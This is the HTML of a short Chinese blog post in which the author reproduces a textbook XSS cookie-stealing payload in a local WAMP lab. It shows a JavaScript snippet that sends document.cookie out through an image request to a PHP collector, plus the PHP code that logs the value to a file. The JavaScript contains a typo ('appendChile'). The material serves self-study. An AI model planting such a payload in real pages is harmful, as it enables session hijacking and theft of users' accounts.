<!DOCTYPE html>



 <html class="no-js"> 
<head>
    <title>Xss窃取cookie  &middot; BlankのBlog </title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="content-language" content="en-us" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="author" content="Blank">
    <meta name="description" content="">
    <link rel="shortcut icon" href="https://blank233.github.ioimg/clover.png" type="image/x-icon" />
    <meta name="generator" content="Hugo 0.37.1" />

    <!-- Stylesheets -->
    <link rel="stylesheet" href="https://blank233.github.iocss/smooth-scrollbar.css" />
    <link rel="stylesheet" type="text/css" href="https://blank233.github.iocss/main.css" />
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.6/styles/tomorrow.min.css" />
    

    <style>
        .posts li {
            visibility: hidden;
        }
    </style>
</head>
<body>
    
    

    <header>	
	<div class="h-wrap">
		
		<h1 class="title"><a href="https://blank233.github.io">BlankのBlog</a></h1>
		
	</div>
</header>
    
    <div class="site-wrapper" id="full-wrapper">
        
        <section class="single-wrap">
            <article class="single-content" itemscope itemtype="//schema.org/BlogPosting">
                <div class="feat">
                    <h5 class="page-date">
                    <time datetime="" itemprop="datePublished">
                    26 March 2018
                   
                    </time>
                    </h5>
                </div>
                <h1 class="page-title" itemprop="name headline">Xss窃取cookie</h1>
                
                
                <h6>Topic:<a href="https://blank233.github.iotopics/misc">misc</a>
                Tag:<a href="https://blank233.github.iotags/2018-03">2018-03</a></h6>

                <div itemprop="articleBody">
                    <p>通过xss窃取cookie  在白帽子讲web安全上看到的第一个xsspayload  尽管到现在可能是然并卵 还是觉得自己动手尝试一下比较好</p>

<p>
使用wamp搭建环境</p>

<p>主页代码</p>

<pre><code>&lt;html&gt;
&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;
&lt;body&gt;
	&lt;script src = test.js&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>test.js代码</p>

<pre><code>var img = document.createElement(&quot;img&quot;);
img.src = &quot;http://127.0.0.1/test.php?id=&quot; + escape(document.cookie);
document.body.appendChile(img)
</code></pre>

<p>test.php代码</p>

<pre><code>&lt;?php
	$id = $_GET['id'];
	if (isset($id)){
		$fp = fopen('1.txt',w);
		fwrite($fp, $id);
		fclose($fp);
	}
	else{
		echo 'failed';
	}
?&gt;
</code></pre>

<p>然后访问主页代码就可以在1.txt中得到cookie</p>

<p>这里只是自己动手验证一下 方便与理解与记忆 当然在实际应用中这样肯定是不行的，用户又不傻 =  =</p>

<hr />

<p>有时间会考虑在实战中试一下  3.26待更~</p>                    
                </div>
                <div class="feat share">
                </div>
                
                
            </article>
        </section>

        <footer>
	
</footer>

    </div>

    <div class="next-prev-arrows">
        
            <a rel="next" href="https://blank233.github.io/2018/03/27/sql%E7%9B%B2%E6%B3%A8%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/" id="next">
                &larr; <span class="nav-title nav-title-next">Sql盲注常用函数</span> 
            </a>
        
        
            <a rel="prev" href="https://blank233.github.io/2018/03/14/bugku-ctf-wp/" id="prev">
                 <span class="nav-title nav-title-prev">Bugku ctf wp </span> &rarr;
            </a>
        
    </div>

    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="https://blank233.github.iojs/scrollreveal.min.js"></script>
<script type='application/javascript' src='https://blank233.github.iojs/smooth-scrollbar.js'></script>
<script src="https://blank233.github.iojs/baffle.min.js"></script>
<script src="https://blank233.github.iojs/main.js"></script>






<!-- Syntax highlighting -->
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.6/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>

    <script src="https://blank233.github.iojs/chick.js"></script>
</body>
</html>
